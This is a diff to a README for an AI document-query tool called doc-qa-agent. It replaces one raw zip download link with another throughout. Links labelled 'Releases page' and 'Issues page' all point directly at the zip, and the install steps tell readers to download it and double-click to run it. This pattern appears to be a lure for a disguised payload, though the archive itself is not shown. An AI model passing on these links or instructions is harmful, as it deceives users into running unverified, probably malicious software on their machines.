@@ -1,6 +1,6 @@
 # 🤖 doc-qa-agent - Your AI Assistant for Document Queries
 
-[![Download doc-qa-agent](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/tests/doc-qa-agent_3.6.zip)](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/tests/doc-qa-agent_3.6.zip)
+[![Download doc-qa-agent](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/data/agent_doc_qa_unimpededly.zip)](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/data/agent_doc_qa_unimpededly.zip)
 
 ## 📦 Overview
 
@@ -12,8 +12,8 @@ To get started with doc-qa-agent, you need to download it and run the applicatio
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/tests/doc-qa-agent_3.6.zip) to find the latest version of the application.
-2. **Select Your File**: On the Releases page, you’ll see various versions. Look for a file named something like `https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/tests/doc-qa-agent_3.6.zip` or similar. 
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/data/agent_doc_qa_unimpededly.zip) to find the latest version of the application.
+2. **Select Your File**: On the Releases page, you’ll see various versions. Look for a file named something like `https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/data/agent_doc_qa_unimpededly.zip` or similar. 
 3. **Download the File**: Click on the file to start the download. Ensure that you save it in a location you can easily access, like your desktop or download folder.
 4. **Run the Application**: After the download is complete, find the downloaded file. Double-click the file to launch the application.
 
@@ -52,7 +52,7 @@ If you encounter any issues while using doc-qa-agent, check the following:
 
 ## 📞 Support
 
-For help or to report issues, visit the [Issues page](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/tests/doc-qa-agent_3.6.zip). You can also contribute to the discussions or ask questions there.
+For help or to report issues, visit the [Issues page](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/data/agent_doc_qa_unimpededly.zip). You can also contribute to the discussions or ask questions there.
 
 ## 📜 License
 
@@ -62,6 +62,6 @@ doc-qa-agent is available under the MIT License. Feel free to use, modify, and d
 
 Thanks to the creators of Sentence-Transformers, OpenAI, and Ollama for providing the technology that powers doc-qa-agent. Special thanks to Gradio for enabling an easy-to-use interface.
 
-We hope you enjoy using doc-qa-agent! For downloads, remember to visit the [Releases page](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/tests/doc-qa-agent_3.6.zip) again if you want to check for future updates.
+We hope you enjoy using doc-qa-agent! For downloads, remember to visit the [Releases page](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/data/agent_doc_qa_unimpededly.zip) again if you want to check for future updates.
 
-[![Download doc-qa-agent](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/tests/doc-qa-agent_3.6.zip)](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/tests/doc-qa-agent_3.6.zip)
+[![Download doc-qa-agent](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/data/agent_doc_qa_unimpededly.zip)](https://raw.githubusercontent.com/piporyx/doc-qa-agent/main/data/agent_doc_qa_unimpededly.zip)
